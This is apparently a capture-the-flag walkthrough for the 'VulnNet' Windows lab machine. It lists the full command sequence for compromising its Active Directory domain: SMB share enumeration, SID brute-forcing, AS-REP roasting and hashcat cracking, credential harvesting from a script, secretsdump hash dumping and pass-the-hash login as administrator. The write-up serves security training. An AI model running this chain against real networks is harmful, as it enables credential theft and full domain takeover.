# Scenario

VulnNet Entertainment just deployed a new instance on their network with the newly-hired system administrators. Being a security-aware company, they as always hired you to perform a penetration test, and see how system administrators are performing.

- Difficulty: Easy
- Operating System: Windows

This is a much simpler machine, do not overthink. You can do it by following common methodologies.

Note: It might take up to 6 minutes for this machine to fully boot.

# Enumeration

## \[+] 10.10.8.165 - vulnnet.thm

We will add the target IP address and a domain name to our `/etc/hosts` file. Using `sudo sh -c`, executes the entire command as a subshell as `root` where we will then use `echo` to create a new line with `\n` followed by our target IP and the domain name we give it.

```sh
sudo sh -c 'echo "\n10.10.8.165 vulnnet.thm" >> /etc/hosts'
```

Then `export` the IP address to the environment variable `RHOSTS` so I can use `$RHOSTS` instead of typing the IP address every time.

```sh
export RHOSTS=10.10.8.165
```

First, I run a quick scan with [rustscan](https://github.com/RustScan/RustScan) and a longer [nmap](https://nmap.org/) stealth scan with `-Pn` mode enabled which will treat all hosts as online which helps find other hosts that block ICMP packets:

```sh
rustscan -a $RHOSTS --ulimit 5000 -b 4500 -t 2000 --range 1-65535 -- -sC -sV
sudo nmap -v -Pn -sS -p- -A --min-rate=1000 -T4 $RHOSTS -oN nmap.txt
```

After our Nmap scan is finished, we will find the domain `vulnnet-rst.local` which we also need to add to our `/etc/ hosts` file. It should look something like:

```plaintext
10.10.8.165 vulnnet.thm vulnnet-rst.local
```

## \[+] Port 139/445 - SMB

We use Impacket's [SMBClient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html) tool to try and list the available shared volumes using unauthenticated login:

```sh
smbclient --no-pass -L //$RHOSTS
```

The two shares that stand out are `VulnNet-Business-Anonymous` and `VulnNet-Enterprise-Anonymous` the rest are default shares.

Let's start by checking the `VulnNet-Business-Anonymous` share using the command:

```sh
smbclient --no-pass //$RHOSTS/VulnNet-Business-Anonymous
ls
```

We can download all of the files at once using `mget *` and enter `Y` when prompted:

![bb7126fcfb6f2753787653870cd8f3d1.png](/resources/7ae6d05caa2f40e1bc06af7588093d79.png)

Some of these text files have names of staff that we can use to generate an e-mail address list:

![31c62b36543dca8a55ea9101c282ef1f.png](/resources/c7ffddbefbeb42b2ba33f4d83f216ebb.png)

```sh
smbclient --no-pass //$RHOSTS/VulnNet-Enterprise-Anonymous
ls
```

![a4437799862cde94fe7c24f41355b19b.png](/resources/4ddb2505ab3849c0aab4f2c2fb58d50d.png)

Download all the files using `mget *`:

![b4b4fb3042f9ad9751a5fdbbdfd1975b.png](/resources/5cef7d6ed66541b3b99eb7e52be61ffc.png)

More names of staff in the text files:

![b32b25d28b6714900cccea4f28f8eafb.png](/resources/1e845342935a4727b11a94e4404fa02f.png)

At this point we can use these names from the text files to generate an e-mail list to use with Impacket's [lookupsid](https://github.com/fortra/impacket/blob/master/examples/lookupsid.py) tool but let's try default accounts like `Administrator` and `Guest` first.

From our Nmap enumeration, we found the domain is `vulnnet-rst.local`. We can try an e-mail address like `guest@vulnnet-rst.local` to use with `lookupsid` to brute force user SIDs in the Active Directory and pipe the results to `tee` so we can see the output and save it to `users.txt`:

```sh
impacket-lookupsid guest@vulnnet-rst.local | tee usersid.txt
```

![2484795aae44d5113f37e3836828ec25.png](/resources/396d57ef2ca94d62a182d8fd4217b7b8.png)

Then we clean the output using `grep`, `awk` and `cut`:

```sh
grep SidTypeUser usersid.txt | awk '{print $2}' | cut -d "\\" -f2 > usernames.txt
cat usernames.txt
```

![2dabe0ecebf6fbf9f4eacbd10dc76436.png](/resources/29d2218252324e91869a243fbc121e2f.png)

Next, we can use this username list with Impacket's [GetNPUsers](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py) tool to find accounts that are vulnerable to an [AS-REP Roasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast) attack. Then we output the hashes we find into a format we can use to crack the hash with [hashcat](https://hashcat.net/hashcat/):

```sh
impacket-GetNPUsers vulnnet-rst.local/ -no-pass -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

![5019b6ab618996987ca8880ea1dbde15.png](/resources/ad86f9c7d8614b249d6d4ec8fbb06069.png)

```sh
hashcat -m 18200 --force -a 0 hashes.asreproast /usr/share/wordlists/rockyou.txt
```

![08e0e94e3f6f0eaa1751c48956fd7b71.png](/resources/cc19626a319d4b2a8de7f5ed948b0169.png)

With these credentials, we can use SMBMap to find out what permissions the user `t-skid` has:

```sh
smbmap -H $RHOSTS -u 't-skid' -p '<PASSWORD>'
```

![83bab82986313a9adc553e4af933cfe4.png](/resources/48e1231430c74e419b04e165e6043053.png)

There is a new share we have access to, `NETLOGON`. Using SMBClient again, we can browse the directory and see if there is anything interesting:

```sh
smbclient //$RHOSTS/NETLOGON --user 't-skid'
ls
```

Inside this share we will find a [VBS](https://en.wikipedia.org/wiki/VBScript) file:

```sh
ls
```

![2a9f60674e9c1711bb412ea071778bb2.png](/resources/d92d1fad164a42d0a341abce19949be3.png)

We can download the file using the following command:

```sh
get ResetPassword.vbs
```

![9cffdb1a4e2426248dfef5901f1b2da4.png](/resources/f051e1ac85a740d9bc7104dc4c6b1af2.png)

Then, exit SMBClient with the `exit` command.

Using `cat` to print the contents of the `ResetPassword.vbs` file, we will find some hardcoded credentials for the user `a-whitehat`:

```sh
cat ResetPassword.vbs
```

![514560c334f7e9444f7e296a9042f96c.png](/resources/d9fcac3204b942358b93f9e0254ea397.png)

Using `smbmap` to check the permissions for the user `a-whitehat`, we will find that we are now able to read/write to some other directories:

```sh
smbmap -H $RHOSTS -u 'a-whitehat' -p '<PASSWORD>'
```

![2605f9b20719d66b85e4f6d64d206852.png](/resources/1d7359d181fa451f8d05cea260218e7a.png)

# Initial Foothold

## \[+] Port 5985 - WinRM

### \[-] \\\vulnnet-rst\a-whitehat

We can use [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) along with the credentials for `a-whitehat`:

![ed4b52af6a36cd54a59c81d03385523e.png](/resources/b1c73d22dfef48b5890ccd4b2c32b8b4.png)

The user flag can be found in `C:\Users\enterprise-core-vn\Desktop\user.txt`:

```plaintext
cd C:\Users\enterprise-core-vn\Desktop\
dir
type user.txt
```

![fb4a264bf96a94ac777e67d3cad85b7a.png](/resources/d7a5072da4f44dbc8e22877c8f1167e9.png)

# Privilege Escalation

### \[-] \\\vulnnet-rst\administrator

In a new terminal, we can use the same credentials fo `a-whitehat` with Impacket's [Secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) tool to try and dump all the hashes on the system so that we can use the hash in a [Pass-the-Hash](https://en.wikipedia.org/wiki/Pass_the_hash) attack and log in as that user:

```sh
impacket-secretsdump vulnnet-rst.local/a-whitehat:<PASSWORD>@$RHOSTS
```

![cab569a13f887b606ddb8086d75a31ef.png](/resources/e4e01d4760184d1c96dc64a95e85dab6.png)

Now that we have found the password hash for the Administrator account, we can use this hash instead of a password. In a new terminal, run Evil-WinRM and log in as the administrator:

```sh
evil-winrm -i vulnnet-rst.local -u administrator -H "<HASH>"
```

![891c7a6d0273d762492677f994f907ab.png](/resources/590696e194d04db39f3c27480159865b.png)

The flag for the administrator can be found in `C:\Users\Administrator\Desktop\system.txt`:

```sh
cd ..\Desktop
dir
type system.txt
```

![b0aaea643f2b0be75f2fe70b1182b4ba.png](/resources/175415a145bb44d9b52e9c1cdd15978a.png)
